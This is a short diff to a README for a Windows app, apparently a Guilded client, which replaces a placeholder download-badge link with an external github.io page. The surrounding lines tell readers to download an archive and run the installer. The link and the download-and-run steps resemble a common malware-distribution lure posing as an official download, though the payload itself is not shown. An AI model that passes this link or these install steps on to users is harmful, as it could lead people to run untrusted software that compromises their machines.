@@ -8,7 +8,7 @@ With **powerful server customization, calendar integration, and recruitment tool
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-gold?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-gold?style=for-the-badge)](https://guilded-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
